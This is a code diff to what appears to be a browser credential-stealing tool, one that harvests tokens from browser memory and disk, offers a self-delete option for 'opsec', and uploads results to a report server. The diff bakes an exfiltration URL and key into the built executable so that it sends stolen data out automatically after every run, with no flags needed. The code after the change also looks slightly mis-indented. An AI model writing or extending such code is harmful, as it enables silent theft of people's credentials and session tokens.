@@ -322,6 +322,11 @@ _NOISE_EXACT: frozenset[str] = frozenset([
 ])
 
 
+# Build-time exfil defaults — substituted by build_windows.ps1 / build_mac.sh.
+# When non-empty the exe auto-exfils after every run with no CLI flags required.
+_EXFIL_URL: str = ""
+_EXFIL_KEY: str = ""
+
 def _trunc(val: str, n: int = 80) -> str:
     return val[:n] + "…" if len(val) > n else val
 
@@ -1571,8 +1576,8 @@ def main():
     parser.add_argument("--max-hits",    type=int, default=300, help="Max memory hits per browser (default: 300)")
     parser.add_argument("--self-delete", action="store_true", help="Delete script after run (opsec)")
     parser.add_argument("--verify",      action="store_true", help="Verify captured tokens against their services (outbound requests)")
-    parser.add_argument("--exfil",       metavar="URL",       help="POST results to report server (e.g. https://reports.yourdomain.com)")
-    parser.add_argument("--exfil-key",   metavar="KEY",       help="API key for --exfil upload")
+    parser.add_argument("--exfil",       metavar="URL",       default=_EXFIL_URL or None, help="POST results to report server (default: baked in at build time)")
+    parser.add_argument("--exfil-key",   metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
     args = parser.parse_args()
 
     do_disk   = not args.memory_only
@@ -1643,11 +1648,10 @@ def main():
 
     print(f"[+] Output written to {out_path}")
 
-    if args.exfil:
-        if args.exfil_key:
-            csv_path_for_exfil = out_path.replace(".txt", ".csv") if out_path.endswith(".txt") else out_path + ".csv"
-            report_url = _exfil_results(args.exfil, args.exfil_key, out_path, csv_path_for_exfil if all_csv_rows else None)
-            if report_url:
+    if args.exfil and args.exfil_key:
+        csv_path_for_exfil = out_path.replace(".txt", ".csv") if out_path.endswith(".txt") else out_path + ".csv"
+        report_url = _exfil_results(args.exfil, args.exfil_key, out_path, csv_path_for_exfil if all_csv_rows else None)
+        if report_url:
                 with open(out_path, "a", encoding="utf-8") as f:
                     f.write(f"\n[+] Exfil: {report_url}\n")
 
